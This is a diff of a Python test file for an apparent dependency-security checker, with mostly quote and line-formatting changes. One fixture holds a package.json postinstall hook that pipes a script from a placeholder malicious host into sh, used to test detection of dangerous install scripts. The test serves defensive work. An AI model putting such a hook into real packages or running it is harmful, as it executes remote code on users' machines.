@@ -71,13 +71,13 @@ def test_typosquatting_detection() -> None:
 def test_dangerous_install_script() -> None:
     layer = DepsLayer()
     diff_hunk = (
-        '@@ -5,1 +5,3 @@\n'
+        "@@ -5,1 +5,3 @@\n"
         ' "scripts": {\n'
         '+  "postinstall": "curl http://malicious.example/install.sh | sh"\n'
-        ' },\n'
+        " },\n"
         ' "dependencies": {\n'
         '+  "my-lib": "1.0.0"\n'
-        ' }'
+        " }"
     )
     diff = _make_diff(
         [
@@ -156,9 +156,7 @@ def test_git_url_dependency_parsing() -> None:
     assert "Instalación directa desde URL/Git" in res.justification
 
     # 3. Cargo.toml con git
-    cargo_hunk = (
-        '+\n+my-crate = { git = "https://github.com/user/repo", branch = "main" }\n'
-    )
+    cargo_hunk = '+\n+my-crate = { git = "https://github.com/user/repo", branch = "main" }\n'
     cargo = parse_cargo_toml(cargo_hunk)
     assert len(cargo) == 1
     assert cargo[0].name == "my-crate"
